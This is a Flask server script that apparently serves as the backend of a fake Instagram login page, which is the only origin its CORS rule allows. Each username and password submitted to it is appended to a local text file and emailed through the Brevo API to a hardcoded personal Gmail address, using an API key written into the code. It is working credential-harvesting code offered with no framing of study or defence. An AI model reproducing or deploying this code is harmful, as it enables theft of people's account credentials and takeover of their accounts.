from flask import Flask, request, jsonify
from datetime import datetime
from flask_cors import CORS
import sib_api_v3_sdk
from sib_api_v3_sdk.rest import ApiException
import os

app = Flask(__name__)

# Allowed origins
CORS(app, resources={r"/*": {"origins": [
    "https://phishing-instagram-liard.vercel.app",
]}})

def send_email_brevo(username, password):
    # Configure API key
    configuration = sib_api_v3_sdk.Configuration()
    configuration.api_key['api-key'] = 'mAK4zDHMnZ8WObLc'

    # Create an instance of the API class
    api_instance = sib_api_v3_sdk.TransactionalEmailsApi(sib_api_v3_sdk.ApiClient(configuration))
    
    # Create email content
    subject = "New Login Credentials"
    html_content = f"""
    <html>
        <body>
            <h2>New login credentials received:</h2>
            <p><strong>Username:</strong> {username}</p>
            <p><strong>Password:</strong> {password}</p>
            <p><strong>Timestamp:</strong> {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}</p>
        </body>
    </html>
    """

    sender = {"name": "Login System", "email": "noreply@yourdomain.com"}
    to = [{"email": "rakshitjadon1903@gmail.com", "name": "Rakshit"}]

    send_smtp_email = sib_api_v3_sdk.SendSmtpEmail(
        to=to,
        html_content=html_content,
        sender=sender,
        subject=subject
    )

    try:
        api_response = api_instance.send_transac_email(send_smtp_email)
        print(f"Email sent successfully: {api_response}")
        return True
    except ApiException as e:
        print(f"Exception when calling SMTPApi->send_transac_email: {e}")
        return False

@app.route("/", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        data = request.get_json(silent=True)
        if data:
            username = data.get("username", "")
            password = data.get("password", "")
        else:
            username = request.form.get("username", "")
            password = request.form.get("password", "")

        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        try:
            # Save credentials to file
            with open("create.txt", "a", encoding="utf-8") as f:
                f.write(
                    f"Timestamp: {timestamp}\nUsername: {username}\nPassword: {password}\n{'='*50}\n"
                )
            
            # Send email using Brevo
            email_sent = send_email_brevo(username, password)
            if not email_sent:
                print("Failed to send email")
            
        except Exception as e:
            return jsonify({"status": "error", "message": "Operation failed", "error": str(e)}), 500

        return jsonify({
            "status": "success",
            "message": "Login data received",
            "username": username
        }), 200

    return jsonify({"status": "ok", "message": "POST username & password to this endpoint"}), 200

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 1111)))
